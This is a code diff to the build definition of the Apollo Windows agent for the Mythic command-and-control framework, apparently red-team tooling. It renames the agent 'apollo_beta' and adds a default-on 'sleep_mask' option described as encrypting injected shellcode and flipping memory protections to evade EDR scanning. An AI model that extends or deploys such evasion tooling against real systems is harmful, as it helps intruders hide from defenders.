@@ -13,21 +13,21 @@ import pathlib
 from mythic_container.MythicRPC import *
 
 
-class Apollo(PayloadType):
-    name = "apollo"
+class ApolloBeta(PayloadType):
+    name = "apollo_beta"
     file_extension = "exe"
-    author = "@djhohnstein, @its_a_feature_"
+    author = "@djhohnstein, @its_a_feature_, @svanstrijp"
     mythic_encrypts = True
     supported_os = [
         SupportedOS.Windows
     ]
-    semver = "2.4.9"
+    semver = "3.0.0"
     wrapper = False
-    wrapped_payloads = ["scarecrow_wrapper", "service_wrapper"]
+    wrapped_payloads = []
     note = """
-A fully featured .NET 4.0 compatible training agent. Version: {}. 
-NOTE: P2P Not compatible with v2.2 agents! 
-NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since their arguments are different
+Apollo Beta — Enhanced .NET 4.0 Windows agent with sleep-time memory encryption and permission flipping.
+Built-in EDR evasion: XOR encrypts injected memory regions and flips page protections (RX?RW) during sleep cycles.
+Version: {}
     """.format(semver)
     supports_dynamic_loading = True
     shellcode_format_options = ["Binary", "Base64", "C", "Ruby", "Python", "Powershell", "C#", "Hex"]
@@ -54,6 +54,27 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
             ui_position=1,
         ),
         BuildParameter(
+            name="sleep_mask",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=True,
+            description="Enable sleep-time memory encryption. When enabled, injected shellcode regions are XOR-encrypted and page protections are flipped to RW during agent sleep to evade in-memory scanning.",
+            ui_position=2,
+        ),
+        BuildParameter(
+            name="debug",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Create a DEBUG version.",
+            ui_position=3,
+        ),
+        BuildParameter(
+            name="adjust_filename",
+            parameter_type=BuildParameterType.Boolean,
+            default_value=False,
+            description="Automatically adjust payload extension based on selected choices.",
+            ui_position=4,
+        ),
+        BuildParameter(
             name="shellcode_format",
             parameter_type=BuildParameterType.ChooseOne,
             choices=shellcode_format_options,
@@ -63,7 +84,7 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode")
             ],
-            ui_position=4
+            ui_position=5
         ),
         BuildParameter(
             name="shellcode_bypass",
@@ -75,22 +96,8 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
             hide_conditions=[
                 HideCondition(name="output_type", operand=HideConditionOperand.NotEQ, value="Shellcode")
             ],
-            ui_position=5
+            ui_position=6
         ),
-        BuildParameter(
-            name="adjust_filename",
-            parameter_type=BuildParameterType.Boolean,
-            default_value=False,
-            description="Automatically adjust payload extension based on selected choices.",
-            ui_position=3,
-        ),
-        BuildParameter(
-            name="debug",
-            parameter_type=BuildParameterType.Boolean,
-            default_value=False,
-            description="Create a DEBUG version.",
-            ui_position=2,
-        )
     ]
     c2_profiles = ["http", "smb", "tcp", "websocket"]
     agent_path = pathlib.Path(".") / "apollo" / "mythic"
@@ -117,7 +124,7 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
         defines_commands_upper = ["#define EXIT"]
         if self.get_parameter('debug'):
             possibleCommands = await SendMythicRPCCommandSearch(MythicRPCCommandSearchMessage(
-                SearchPayloadTypeName="apollo",
+                SearchPayloadTypeName="apollo_beta",
             ))
             if possibleCommands.Success:
                 resp.updated_command_list = [c.Name for c in possibleCommands.Commands]
@@ -127,12 +134,13 @@ NOTE: v2.3.2+ has a different bof loader than 2.3.1 and are incompatible since t
         special_files_map = {
             "Config.cs": {
                 "payload_uuid": self.uuid,
+                "sleep_mask_enabled": "true" if self.get_parameter("sleep_mask") else "false",
             },
         }
         extra_variables = {
 
         }
-        success_message = f"Apollo {self.uuid} Successfully Built"
+        success_message = f"Apollo Beta {self.uuid} Successfully Built (sleep mask: {'enabled' if self.get_parameter('sleep_mask') else 'disabled'})"
         stdout_err = ""
         defines_profiles_upper = []
         compileType = "debug" if self.get_parameter('debug') else "release"
